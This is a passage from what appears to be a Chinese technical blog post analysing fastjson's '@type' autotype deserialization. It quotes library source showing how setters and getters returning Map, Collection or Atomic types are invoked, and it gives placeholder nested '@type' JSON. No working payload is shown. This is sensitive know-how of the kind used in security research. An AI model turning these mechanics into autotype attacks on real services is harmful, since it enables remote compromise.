</span></span></code></pre></div><p>可以看到判断了一下开头为 get, 且第四位为大写, 重点是后面检测了返回值, 必须继承 Map, Collection 或者是 AtomicXxxx. 这些是干嘛的呢?<br>可以看一下具体这些方法会被怎么调用就知道了</p><p>com.alibaba.fastjson.parser.deserializer.FieldDeserializer</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd>void</span> <span style=color:#50fa7b>setValue</span><span style=color:#ff79c6>(</span>Object object<span style=color:#ff79c6>,</span> Object value<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>value <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span> <span style=color:#ff79c6>||</span> <span style=color:#ff79c6>!</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>fieldInfo</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>fieldClass</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>isPrimitive</span><span style=color:#ff79c6>())</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>        <span style=color:#ff79c6>try</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>            Method method <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>fieldInfo</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>method</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>            <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>method <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span> <span style=color:#6272a4>// 优先调用 method, 下面是直接复制给 field, 与这里类似, 不复制了
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#6272a4></span>                <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>fieldInfo</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>getOnly</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>                    <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>fieldInfo</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>fieldClass</span> <span style=color:#ff79c6>==</span> AtomicInteger<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>                        AtomicInteger atomic <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>AtomicInteger<span style=color:#ff79c6>)</span>method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>invoke</span><span style=color:#ff79c6>(</span>object<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>                        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>atomic <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>                            atomic<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(((</span>AtomicInteger<span style=color:#ff79c6>)</span>value<span style=color:#ff79c6>).</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>                        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>                    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>fieldInfo</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>fieldClass</span> <span style=color:#ff79c6>==</span> AtomicLong<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>                        AtomicLong atomic <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>AtomicLong<span style=color:#ff79c6>)</span>method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>invoke</span><span style=color:#ff79c6>(</span>object<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>                        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>atomic <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>                            atomic<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(((</span>AtomicLong<span style=color:#ff79c6>)</span>value<span style=color:#ff79c6>).</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>                        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>                    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span><span style=color:#ff79c6>this</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>fieldInfo</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>fieldClass</span> <span style=color:#ff79c6>==</span> AtomicBoolean<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>                        AtomicBoolean atomic <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>AtomicBoolean<span style=color:#ff79c6>)</span>method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>invoke</span><span style=color:#ff79c6>(</span>object<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>                        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>atomic <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>                            atomic<span style=color:#ff79c6>.</span><span style=color:#50fa7b>set</span><span style=color:#ff79c6>(((</span>AtomicBoolean<span style=color:#ff79c6>)</span>value<span style=color:#ff79c6>).</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>());</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>                        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>                    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>Map<span style=color:#ff79c6>.</span><span style=color:#50fa7b>class</span><span style=color:#ff79c6>.</span><span style=color:#50fa7b>isAssignableFrom</span><span style=color:#ff79c6>(</span>method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getReturnType</span><span style=color:#ff79c6>()))</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>                        Map map <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>Map<span style=color:#ff79c6>)</span>method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>invoke</span><span style=color:#ff79c6>(</span>object<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>                        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>map <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>                            map<span style=color:#ff79c6>.</span><span style=color:#50fa7b>putAll</span><span style=color:#ff79c6>((</span>Map<span style=color:#ff79c6>)</span>value<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>                        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>                    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>                        Collection collection <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>(</span>Collection<span style=color:#ff79c6>)</span>method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>invoke</span><span style=color:#ff79c6>(</span>object<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>                        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>collection <span style=color:#ff79c6>!=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>                            collection<span style=color:#ff79c6>.</span><span style=color:#50fa7b>addAll</span><span style=color:#ff79c6>((</span>Collection<span style=color:#ff79c6>)</span>value<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>                        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>                    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>                <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>                    method<span style=color:#ff79c6>.</span><span style=color:#50fa7b>invoke</span><span style=color:#ff79c6>(</span>object<span style=color:#ff79c6>,</span> value<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>                <span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>可以看到是调用了 getter, 然后赋值给这些对象, 相信现在就能明白这些是干嘛的了, 如果有一个对象, 里面有一个属性是 <code>HashMap test</code>, 且有一个 <code>public HashMap getTest()</code> 方法, 那么在反序列化时, <code>{"@type": "xxx.xxx", "test": {"aa": "sss"}}</code>, key => aa, value => sss 将会被加到 test 里面去, 这算一个小 feature 吧, 方便开发. 但是确实有点反直觉.</p><p>这里顺便看一下正规反序列 (toJSON, toJSONString) 时使用的 getter 是怎么判断的, 在 <code>com.alibaba.fastjson.util.TypeUtils</code> 的 <code>buildBeanInfo</code>, 里面调用了 <code>computeGetters</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#ff79c6>if</span><span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>startsWith</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;get&#34;</span><span style=color:#ff79c6>)){</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    <span style=color:#ff79c6>if</span><span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>&lt;</span> 4<span style=color:#ff79c6>){</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>        <span style=color:#ff79c6>continue</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    <span style=color:#ff79c6>if</span><span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>equals</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;getClass&#34;</span><span style=color:#ff79c6>)){</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>        <span style=color:#ff79c6>continue</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>    <span style=color:#ff79c6>if</span><span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>equals</span><span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;getDeclaringClass&#34;</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>&amp;&amp;</span> clazz<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isEnum</span><span style=color:#ff79c6>()){</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>        <span style=color:#ff79c6>continue</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    <span style=color:#8be9fd>char</span> c3 <span style=color:#ff79c6>=</span> methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>charAt</span><span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    String propertyName<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    Field field <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    <span style=color:#ff79c6>if</span><span style=color:#ff79c6>(</span>Character<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isUpperCase</span><span style=color:#ff79c6>(</span>c3<span style=color:#ff79c6>)</span> <span style=color:#6272a4>//
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#6272a4></span>            <span style=color:#ff79c6>||</span> c3 <span style=color:#ff79c6>&gt;</span> 512 <span style=color:#6272a4>// for unicode method name
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#6272a4></span>            <span style=color:#ff79c6>){</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>        <span style=color:#ff79c6>if</span><span style=color:#ff79c6>(</span>compatibleWithJavaBean<span style=color:#ff79c6>){</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>            propertyName <span style=color:#ff79c6>=</span> decapitalize<span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>substring</span><span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>        <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span><span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>            propertyName <span style=color:#ff79c6>=</span> Character<span style=color:#ff79c6>.</span><span style=color:#50fa7b>toLowerCase</span><span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>charAt</span><span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>))</span> <span style=color:#ff79c6>+</span> methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>substring</span><span style=color:#ff79c6>(</span>4<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>        propertyName <span style=color:#ff79c6>=</span> getPropertyNameByCompatibleFieldName<span style=color:#ff79c6>(</span>fieldCacheMap<span style=color:#ff79c6>,</span> methodName<span style=color:#ff79c6>,</span> propertyName<span style=color:#ff79c6>,</span> 3<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span><span style=color:#ff79c6>(</span>c3 <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;_&#39;</span><span style=color:#ff79c6>){</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>        propertyName <span style=color:#ff79c6>=</span> methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>substring</span><span style=color:#ff79c6>(</span>4<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>        field <span style=color:#ff79c6>=</span> fieldCacheMap<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>propertyName<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>field <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>            String temp <span style=color:#ff79c6>=</span> propertyName<span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>            propertyName <span style=color:#ff79c6>=</span> methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>substring</span><span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>            field <span style=color:#ff79c6>=</span> ParserConfig<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getFieldFromCache</span><span style=color:#ff79c6>(</span>propertyName<span style=color:#ff79c6>,</span> fieldCacheMap<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>            <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>field <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>                propertyName <span style=color:#ff79c6>=</span> temp<span style=color:#ff79c6>;</span> <span style=color:#6272a4>//减少修改代码带来的影响
</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span><span style=color:#6272a4></span>            <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span><span style=color:#ff79c6>(</span>c3 <span style=color:#ff79c6>==</span> <span style=color:#f1fa8c>&#39;f&#39;</span><span style=color:#ff79c6>){</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>        propertyName <span style=color:#ff79c6>=</span> methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>substring</span><span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span> <span style=color:#ff79c6>if</span><span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>length</span><span style=color:#ff79c6>()</span> <span style=color:#ff79c6>&gt;=</span> 5 <span style=color:#ff79c6>&amp;&amp;</span> Character<span style=color:#ff79c6>.</span><span style=color:#50fa7b>isUpperCase</span><span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>charAt</span><span style=color:#ff79c6>(</span>4<span style=color:#ff79c6>))){</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>        propertyName <span style=color:#ff79c6>=</span> decapitalize<span style=color:#ff79c6>(</span>methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>substring</span><span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>));</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>    <span style=color:#ff79c6>}</span> <span style=color:#ff79c6>else</span><span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>        propertyName <span style=color:#ff79c6>=</span> methodName<span style=color:#ff79c6>.</span><span style=color:#50fa7b>substring</span><span style=color:#ff79c6>(</span>3<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>        field <span style=color:#ff79c6>=</span> ParserConfig<span style=color:#ff79c6>.</span><span style=color:#50fa7b>getFieldFromCache</span><span style=color:#ff79c6>(</span>propertyName<span style=color:#ff79c6>,</span> fieldCacheMap<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>(</span>field <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>null</span><span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span>            <span style=color:#ff79c6>continue</span><span style=color:#ff79c6>;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>        <span style=color:#ff79c6>}</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span>    <span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>可以看到规则是跟取 setter 类似的, 就是方法名开头从 set 改成 get.</p><p>总结一下有 <code>@type</code> 的反序列化大致流程</p><ol><li>parse 到 key = @type, 将 value 作为 class</li><li>反射出类的构造器, 方法, 等</li><li>若不是一些内置包装类或者特殊类 + 存在默认构造器, 那么调用 JavaBeanInfo.build 得到 getter, setter, 属性的信息</li><li>继续扫描 json, 若有对应的 key 可以找到 setter 或者属性, 就调用 setter 或者直接赋值给属性</li></ol><p>另外 autotype 是可以嵌套的, 比如可以</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span>[
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>    {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>        <span style=color:#ff79c6>&#34;@type&#34;</span>: <span style=color:#f1fa8c>&#34;xxx.xxx&#34;</span>,
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>        <span style=color:#ff79c6>&#34;xxx&#34;</span>: <span style=color:#f1fa8c>&#34;xxx&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    },
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>        <span style=color:#ff79c6>&#34;@type&#34;</span>: <span style=color:#f1fa8c>&#34;xxx.xxx&#34;</span>,
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>        <span style=color:#ff79c6>&#34;xxx&#34;</span>: {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>            <span style=color:#ff79c6>&#34;@type&#34;</span>: <span style=color:#f1fa8c>&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>        }
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>    },
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>    {
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        <span style=color:#ff79c6>&#34;@type&#34;</span>: <span style=color:#f1fa8c>&#34;xxx&#34;</span>
